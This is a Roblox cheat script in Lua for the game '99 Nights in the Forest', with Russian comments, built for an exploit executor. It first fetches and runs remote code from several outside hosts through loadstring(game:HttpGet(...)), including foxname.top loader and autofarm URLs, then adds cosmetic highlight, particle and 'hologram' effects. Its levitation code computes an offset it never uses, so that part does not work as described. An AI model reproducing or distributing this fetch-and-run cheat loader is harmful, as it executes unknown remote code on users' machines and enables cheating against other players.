-- =====================================================================
-- ULTIMATE HYBRID SUITE: 99 Nights in the Forest [Hacker-Psychopath Build]
-- Target Executor: Delta X / Custom Environments
-- =====================================================================

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

-- 1. Инициализация базовых инфраструктурных модулей
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/nightsintheforest.lua", true))()
    end)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://foxname.top/loader"))()
        loadstring(game:HttpGet("https://foxname.top/autofarm"))()
    end)
end)

task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/wefwef127382/99daysloader.github.io/refs/heads/main/ringta.lua"))()
    end)
end)

-- 2. Модуль кастомной ауры, визуального доминирования, левитации и голографического терминала
local function applyPsychopathSuite()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    local humanoid = character:WaitForChild("Humanoid")
    local rightArm = character:FindFirstChild("Right Arm") or character:FindFirstChild("RightHand")

    -- Подсветка психопата (красный неоновый контур с тёмной заливкой)
    if not character:FindFirstChild("PsychopathHighlight") then
        local highlight = Instance.new("Highlight")
        highlight.Name = "PsychopathHighlight"
        highlight.Adornee = character
        highlight.FillColor = Color3.fromRGB(120, 0, 0)
        highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
        highlight.FillTransparency = 0.4
        highlight.OutlineTransparency = 0
        highlight.Parent = character
    end

    -- Эффект парового шлейфа (в стиле титанов)
    local attachment = rootPart:FindFirstChild("TitanAttachment") or Instance.new("Attachment", rootPart)
    attachment.Name = "TitanAttachment"
    
    local particles = attachment:FindFirstChild("TitanSteam") or Instance.new("ParticleEmitter")
    particles.Name = "TitanSteam"
    particles.Color = ColorSequence.new(Color3.fromRGB(240, 240, 240), Color3.fromRGB(180, 180, 180))
    particles.Size = NumberSequence.new(1.5, 4.0)
    particles.Transparency = NumberSequence.new(0.3, 1.0)
    particles.Lifetime = NumberRange.new(0.6, 1.2)
    particles.Rate = 45
    particles.Speed = NumberRange.new(6, 14)
    particles.Parent = attachment

    -- Создание голографического экрана читов перед персонажем
    local holoScreen = character:FindFirstChild("HologramTerminal")
    if not holoScreen then
        holoScreen = Instance.new("Part")
        holoScreen.Name = "HologramTerminal"
        holoScreen.Size = Vector3.new(2.5, 1.5, 0.1)
        holoScreen.BrickColor = BrickColor.new("Bright red")
        holoScreen.Material = Enum.Material.Neon
        holoScreen.CanCollide = false
        holoScreen.Transparency = 0.3

        local wConstraint = Instance.new("WeldConstraint")
        wConstraint.Part0 = rootPart
        wConstraint.Part1 = holoScreen
        wConstraint.Parent = holoScreen
        
        -- Позиционирование перед лицом персонажа
        holoScreen.CFrame = rootPart.CFrame * CFrame.new(0, 1, -2)
        holoScreen.Parent = character
    end

    -- Цикл плавающей левитации, анимации взлома и контроля
    local connection
    connection = RunService.RenderStepped:Connect(function()
        if not character or not humanoid or humanoid.Health <= 0 then
            if connection then connection:Disconnect() end
            if holoScreen then holoScreen:Destroy() end
            return
        end

        local timeVal = tick()
        
        -- Плавное зависание над землей с эффектом колебания
        if rootPart then
            local floatOffset = Vector3.new(0, math.sin(timeVal * 6) * 1.0 + 2.5, 0)
            rootPart.Velocity = Vector3.new(0, 0, 0) -- Гасим гравитацию
            
            -- Легкое мерцание голограммы для эффекта активного скрипта
            if holoScreen then
                holoScreen.Transparency = 0.2 + math.sin(timeVal * 15) * 0.1
            end
        end
    end)
end

-- Хук на респаун персонажа
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(1)
    applyPsychopathSuite()
end)

if LocalPlayer.Character then
    task.spawn(applyPsychopathSuite)
end

print("[SYSTEM] Ultimate Hacker-Psychopath & Titan Suite successfully loaded.")
